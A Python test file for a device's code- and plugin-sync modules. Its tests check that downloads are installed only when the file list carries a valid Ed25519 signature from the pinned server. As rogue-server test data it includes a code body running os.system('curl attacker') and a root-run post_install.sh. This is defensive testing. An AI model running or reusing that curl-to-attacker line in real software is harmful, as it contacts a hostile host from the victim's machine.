"""Code and plugin payloads only land if this device's own server signed
the list they came from.

Before this, every downloaded body was checked against a manifest the same
host had just served — which proves the bytes arrived intact and nothing
at all about who sent them. A card prepared from the dashboard now carries
that dashboard's fingerprint, asks for the signed file list, and writes
nothing when the signature does not check out.

DB-free and network-free: ``requests`` is replaced with a fake that serves
whatever the test wants to serve.
"""

from __future__ import annotations

import base64
import hashlib
import json

import pytest

from satellite import _ed25519, code_sync, plugin_sync, server_identity

CODE_EXT_ALLOW = frozenset({".py", ".toml"})


def _server(seed_byte: int = 1):
    seed = bytes([seed_byte]) * 32
    public = _ed25519.public_key(seed)
    return seed, public, server_identity.fingerprint_for(public)


def _envelope(seed, public, channel, manifest):
    return {
        "algorithm": "ed25519",
        "fingerprint": server_identity.fingerprint_for(public),
        "public_key": base64.b64encode(public).decode("ascii"),
        "channel": channel,
        "manifest": manifest,
        "signature": base64.b64encode(
            _ed25519.sign(seed, server_identity.manifest_message(channel, manifest))
        ).decode("ascii"),
    }


class _FakeResponse:
    def __init__(self, *, json_body=None, content=b"", status_code=200):
        self._json, self.content, self.status_code = json_body, content, status_code

    def json(self):
        if self._json is None:
            raise ValueError("not json")
        return self._json

    def raise_for_status(self):
        if self.status_code >= 400:
            raise RuntimeError(f"HTTP {self.status_code}")


class _FakeRequests:
    """Serves the routes the sync modules ask for, and records them."""

    def __init__(self, routes):
        self.routes, self.asked = routes, []

    def get(self, url, timeout=None):
        self.asked.append(url)
        path = url.split(":6370", 1)[-1]
        if path not in self.routes:
            return _FakeResponse(status_code=404)
        return self.routes[path]


BASE = "http://192.168.0.117:6370"


def _file_response(body: bytes):
    return _FakeResponse(content=body)


# ─── the code channel ─────────────────────────────────────────────────────

def _code_routes(seed, public, manifest, bodies, *, signed=True, unsigned=True):
    routes = {}
    if unsigned:
        routes["/v1/satellite-code/manifest"] = _FakeResponse(json_body=manifest)
    if signed:
        routes["/v1/satellite-code/manifest.sig"] = _FakeResponse(
            json_body=_envelope(seed, public, server_identity.CODE_CHANNEL, manifest)
        )
    for rel, body in bodies.items():
        routes[f"/v1/satellite-code/{rel}"] = _file_response(body)
    return routes


def test_a_signed_file_list_from_our_server_is_installed(tmp_path, monkeypatch):
    seed, public, fingerprint = _server()
    body = b"print('hello')\n"
    manifest = {"client.py": hashlib.sha256(body).hexdigest()}
    fake = _FakeRequests(_code_routes(seed, public, manifest, {"client.py": body}))
    monkeypatch.setattr(code_sync, "requests", fake)

    result = code_sync.sync_code(
        BASE, tmp_path / "satellite", CODE_EXT_ALLOW, {},
        expected_fingerprint=fingerprint,
    )
    assert result["downloaded"] == 1
    assert (tmp_path / "satellite" / "client.py").read_bytes() == body
    assert any("manifest.sig" in u for u in fake.asked)


def test_a_file_list_signed_by_another_server_installs_nothing(tmp_path, monkeypatch):
    _seed_a, _public_a, ours = _server(1)
    seed_b, public_b, _theirs = _server(2)
    body = b"import os; os.system('curl attacker')\n"
    manifest = {"client.py": hashlib.sha256(body).hexdigest()}
    fake = _FakeRequests(_code_routes(seed_b, public_b, manifest, {"client.py": body}))
    monkeypatch.setattr(code_sync, "requests", fake)

    root = tmp_path / "satellite"
    with pytest.raises(RuntimeError) as e:
        code_sync.sync_code(
            BASE, root, CODE_EXT_ALLOW, {}, expected_fingerprint=ours
        )
    assert "nothing was written" in str(e.value)
    assert not (root / "client.py").exists()


def test_an_edited_file_list_installs_nothing(tmp_path, monkeypatch):
    seed, public, fingerprint = _server()
    body = b"print('hello')\n"
    manifest = {"client.py": hashlib.sha256(body).hexdigest()}
    routes = _code_routes(seed, public, manifest, {"client.py": body})
    # Same signature, one entry swapped for something else's hash.
    routes["/v1/satellite-code/manifest.sig"]._json["manifest"]["client.py"] = "0" * 64
    fake = _FakeRequests(routes)
    monkeypatch.setattr(code_sync, "requests", fake)

    root = tmp_path / "satellite"
    with pytest.raises(RuntimeError):
        code_sync.sync_code(
            BASE, root, CODE_EXT_ALLOW, {}, expected_fingerprint=fingerprint
        )
    assert not (root / "client.py").exists()


def test_a_pinned_device_will_not_fall_back_to_the_unsigned_list(tmp_path, monkeypatch):
    """A server that serves no signature is not a reason to stop checking
    — it is a reason to say the server needs upgrading."""
    seed, public, fingerprint = _server()
    body = b"print('hello')\n"
    manifest = {"client.py": hashlib.sha256(body).hexdigest()}
    fake = _FakeRequests(
        _code_routes(seed, public, manifest, {"client.py": body}, signed=False)
    )
    monkeypatch.setattr(code_sync, "requests", fake)

    root = tmp_path / "satellite"
    with pytest.raises(RuntimeError) as e:
        code_sync.sync_code(
            BASE, root, CODE_EXT_ALLOW, {}, expected_fingerprint=fingerprint
        )
    assert "upgrade the Domovoi server" in str(e.value)
    assert not (root / "client.py").exists()


def test_a_device_with_no_fingerprint_syncs_as_it_always_did(tmp_path, monkeypatch, caplog):
    """The compatibility promise: a card prepared before identities keeps
    upgrading from the plain manifest, and says out loud that it is
    unverified."""
    seed, public, _fingerprint = _server()
    body = b"print('hello')\n"
    manifest = {"client.py": hashlib.sha256(body).hexdigest()}
    fake = _FakeRequests(
        _code_routes(seed, public, manifest, {"client.py": body}, signed=False)
    )
    monkeypatch.setattr(code_sync, "requests", fake)

    with caplog.at_level("WARNING"):
        result = code_sync.sync_code(
            BASE, tmp_path / "satellite", CODE_EXT_ALLOW, {},
            expected_fingerprint=None,
        )
    assert result["downloaded"] == 1
    assert "no server fingerprint" in caplog.text
    assert not any("manifest.sig" in u for u in fake.asked)


def test_a_body_that_does_not_match_the_signed_list_is_still_refused(tmp_path, monkeypatch):
    """Signing the list does not retire the per-file check — it is what
    makes the per-file check mean something."""
    seed, public, fingerprint = _server()
    manifest = {"client.py": hashlib.sha256(b"the real body").hexdigest()}
    fake = _FakeRequests(
        _code_routes(seed, public, manifest, {"client.py": b"a different body"})
    )
    monkeypatch.setattr(code_sync, "requests", fake)

    with pytest.raises(RuntimeError) as e:
        code_sync.sync_code(
            BASE, tmp_path / "satellite", CODE_EXT_ALLOW, {},
            expected_fingerprint=fingerprint,
        )
    assert "sha256 mismatch" in str(e.value)


# ─── the plugin-payload channel ───────────────────────────────────────────

@pytest.fixture
def payload_sidecars(tmp_path, monkeypatch):
    monkeypatch.setattr(
        plugin_sync, "MANIFEST_SIDECAR", tmp_path / "plugin_payload_manifest.json"
    )
    monkeypatch.setattr(
        plugin_sync, "STATE_SIDECAR", tmp_path / "plugin_payload_state.json"
    )
    monkeypatch.setattr(plugin_sync, "PENDING_FILE", tmp_path / "pending_payload.json")
    return tmp_path


def _plugin_routes(seed, public, manifest, bodies, *, signed=True, unsigned=True):
    routes = {}
    if unsigned:
        routes["/v1/satellite-plugins/manifest"] = _FakeResponse(json_body=manifest)
    if signed:
        routes["/v1/satellite-plugins/manifest.sig"] = _FakeResponse(
            json_body=_envelope(seed, public, server_identity.PLUGIN_CHANNEL, manifest)
        )
    for rel, body in bodies.items():
        routes[f"/v1/satellite-plugins/{rel}"] = _file_response(body)
    return routes


def test_a_payload_list_signed_by_another_server_installs_nothing(
    payload_sidecars, monkeypatch
):
    """These are the files whose post_install runs as root, so this is the
    channel where a wrong answer costs the most."""
    _seed_a, _public_a, ours = _server(1)
    seed_b, public_b, _ = _server(2)
    body = b"#!/bin/sh\nid\n"
    manifest = {
        "files": {"rogue/post_install.sh": hashlib.sha256(body).hexdigest()},
        "meta": {"rogue": {"post_install": "post_install.sh"}},
    }
    fake = _FakeRequests(
        _plugin_routes(seed_b, public_b, manifest,
                       {"rogue/post_install.sh": body})
    )
    monkeypatch.setattr(plugin_sync, "requests", fake)

    root = payload_sidecars / "payloads"
    with pytest.raises(RuntimeError) as e:
        plugin_sync.sync_plugin_payloads(
            BASE, root, expected_fingerprint=ours
        )
    assert "nothing was written" in str(e.value)
    assert not (root / "rogue" / "post_install.sh").exists()
    assert not plugin_sync.PENDING_FILE.exists()


def test_a_signed_payload_list_from_our_server_is_installed(
    payload_sidecars, monkeypatch
):
    seed, public, fingerprint = _server()
    body = b"#!/bin/sh\ntrue\n"
    manifest = {
        "files": {"radio/setup.sh": hashlib.sha256(body).hexdigest()},
        "meta": {},
    }
    fake = _FakeRequests(
        _plugin_routes(seed, public, manifest, {"radio/setup.sh": body})
    )
    monkeypatch.setattr(plugin_sync, "requests", fake)

    root = payload_sidecars / "payloads"
    result = plugin_sync.sync_plugin_payloads(
        BASE, root, expected_fingerprint=fingerprint
    )
    assert result["downloaded"] == 1
    assert (root / "radio" / "setup.sh").read_bytes() == body
    assert json.loads(
        plugin_sync.MANIFEST_SIDECAR.read_text(encoding="utf-8")
    )["files"] == manifest["files"]


def test_a_pinned_device_refuses_a_payload_server_with_no_signature(
    payload_sidecars, monkeypatch
):
    seed, public, fingerprint = _server()
    manifest = {"files": {}, "meta": {}}
    fake = _FakeRequests(_plugin_routes(seed, public, manifest, {}, signed=False))
    monkeypatch.setattr(plugin_sync, "requests", fake)

    with pytest.raises(RuntimeError) as e:
        plugin_sync.sync_plugin_payloads(
            BASE, payload_sidecars / "payloads", expected_fingerprint=fingerprint
        )
    assert "upgrade the Domovoi server" in str(e.value)
